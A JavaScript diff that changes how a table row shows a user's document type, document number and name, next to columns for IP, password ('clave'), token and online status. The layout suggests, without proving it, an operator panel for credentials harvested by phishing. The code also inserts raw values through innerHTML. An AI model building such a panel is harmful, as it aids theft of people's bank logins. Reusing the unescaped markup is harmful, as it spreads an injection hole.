@@ -202,22 +202,35 @@ function updateRow(tr, row) {
   tr.querySelector('.col-ip').textContent = row.ip || '—'
   const userCell = tr.querySelector('.col-user');
   const userStr = row.user || '—';
-  if (userStr.includes(' / ')) {
-    const parts = userStr.split(' / ');
-    const docPart = parts[0];
-    const namePart = parts[1];
-    let docNum = docPart;
-    if (docPart.includes(':')) {
-      docNum = docPart.split(':')[1];
+  
+  let docTypeStr = "";
+  let docNumStr = userStr;
+  let authorizedUserStr = "";
+  
+  if (userStr !== '—') {
+    const mainParts = userStr.split(' / ');
+    const docInfo = mainParts[0];
+    if (mainParts[1]) {
+      authorizedUserStr = mainParts[1];
     }
-    userCell.innerHTML = `
-      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
-      <span class="subpill-divider">/</span>
-      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
-    `;
-  } else {
-    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`;
+    
+    if (docInfo.includes(':')) {
+      const docParts = docInfo.split(':');
+      docTypeStr = docParts[0];
+      docNumStr = docParts[1];
+    }
   }
+
+  let html = "";
+  if (docTypeStr) {
+    html += `<span class="doc-type-label" style="font-size: 10px; color: #8a8e9e; display: block; margin-bottom: 2px; text-transform: uppercase; font-weight: 600;">${docTypeStr}</span>`;
+  }
+  html += `<span class="copy-subpill" data-val="${docNumStr}" title="Copiar Documento">${docNumStr}</span>`;
+  if (authorizedUserStr) {
+    html += ` <span class="subpill-divider" style="color: #cbd5e1; margin: 0 4px;">/</span> <span class="copy-subpill" data-val="${authorizedUserStr}" title="Copiar Usuario">${authorizedUserStr}</span>`;
+  }
+  
+  userCell.innerHTML = html;
   tr.querySelector('.col-pass').textContent = row.clave || '—'
   tr.querySelector('.col-token').textContent = row.token || '—'
   tr.querySelector('.col-online').innerHTML = online
